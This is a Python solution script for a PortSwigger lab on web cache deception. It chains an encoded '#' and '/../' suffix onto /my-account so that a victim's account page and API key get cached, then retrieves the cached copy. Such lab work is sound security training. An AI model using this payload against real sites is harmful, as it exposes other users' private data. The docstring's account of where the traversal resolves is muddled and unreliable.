"""
Lab 3: Exploiting cache server normalization for web cache deception
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization
Difficulty: Practitioner

📝 The cache decodes %2f%2e%2e%2f (/../) and resolves it against its
static-DIRECTORY rule for /resources/ — even though, once resolved, that
dot-segment sequence actually points back at /my-account. A '#' fragment
delimiter hides the real path from the origin's own routing while the
cache still walks through and normalizes it for rule-matching.
"""

from utils import get_session, cache_status, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Step 1: confirm /resources/ is a static-directory cache rule —")
    note("any path under it should cache, even a 404.")
    r = s.get(f"{TARGET}/resources/nonexistent")
    log(f"Status: {r.status_code}, X-Cache: {cache_status(r)!r}")
    r2 = s.get(f"{TARGET}/resources/nonexistent")
    log(f"Second request X-Cache: {cache_status(r2)!r}")

    note("Step 2: confirm '#' makes the ORIGIN ignore everything after it")
    note("(so my-account%23%2f%2e%2e%2fresources still serves /my-account).")
    r3 = s.get(f"{TARGET}/my-account%23%2f%2e%2e%2fresources?cb=1")
    log(f"Status: {r3.status_code}, contains account info: "
        f"{'wiener' in r3.text or 'API' in r3.text}")

    note("Step 3: confirm the CACHE normalizes the dot-segments and matches")
    note("its /resources/ rule on the full string despite the '#'.")
    r4 = s.get(f"{TARGET}/my-account%23%2f%2e%2e%2fresources?cb=1")
    log(f"Second request X-Cache: {cache_status(r4)!r}")

    exploit_url = f"{TARGET}/my-account%23%2f%2e%2e%2fresources?wcd"
    log(f"Deliver this URL to carlos: {exploit_url}")

    note("After carlos visits it, fetch the same URL to retrieve his cached")
    note("page containing his API key.")
    r5 = s.get(exploit_url)
    log(f"Retrieved: {r5.text[:300]}")


if __name__ == "__main__":
    run()
